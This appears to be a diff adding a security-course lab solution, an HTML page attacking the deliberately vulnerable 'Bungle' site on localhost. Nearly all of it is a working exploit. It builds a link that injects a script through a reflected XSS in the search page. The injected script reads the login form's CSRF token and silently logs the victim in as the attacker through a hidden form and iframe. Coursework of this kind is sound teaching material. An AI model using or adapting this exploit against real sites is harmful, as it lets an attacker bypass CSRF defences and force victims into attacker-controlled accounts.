@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<meta charset="UTF-8">
+	<title>CSRF 2.1</title>
+</head>
+
+<body>
+	<h3 id="attack-link"></h3>
+
+	<script>
+		// The XSS runs in Bungle's origin, so it can read the token from the real login form.
+		function payload() {
+			$("html").hide();
+
+			function addField(form, name, value) {
+				var field = document.createElement("input");
+
+				field.type = "hidden";
+				field.name = name;
+				field.value = value;
+				form.appendChild(field);
+			}
+
+			var loginUrl = "http://localhost/project2/login?csrfdefense=1&xssdefense=0";
+
+			// Loading the form sets Bungle's csrf cookie and exposes its matching hidden token.
+			$("html").load(loginUrl, function () {
+				var csrfToken = $("input[name=csrf]").val();
+				var loginFrame = document.createElement("iframe");
+				var loginForm = document.createElement("form");
+
+				loginFrame.name = "login-frame";
+				loginFrame.hidden = true;
+				document.body.appendChild(loginFrame);
+
+				loginForm.method = "POST";
+				loginForm.action = loginUrl;
+				loginForm.target = "login-frame";
+
+				addField(loginForm, "username", "attacker");
+				addField(loginForm, "password", "badguy4");
+				addField(loginForm, "csrf", csrfToken);
+				document.body.appendChild(loginForm);
+				loginForm.submit();
+			});
+		}
+
+		// xssdefense=0 deliberately enables the XSS needed to obtain the CSRF token.
+		function makeLink(target) {
+			var injectedScript = "<script>" +
+				payload.toString() +
+				";payload()<\/script>";
+
+			return target + "search?xssdefense=0&csrfdefense=1&q=" +
+				encodeURIComponent(injectedScript);
+		}
+
+		var target = "http://localhost/project2/";
+		var url = makeLink(target);
+		var link = document.createElement("a");
+
+		link.href = url;
+		link.textContent = "Try Bungle!";
+		document.getElementById("attack-link").appendChild(link);
+	</script>
+</body>
+
+</html>
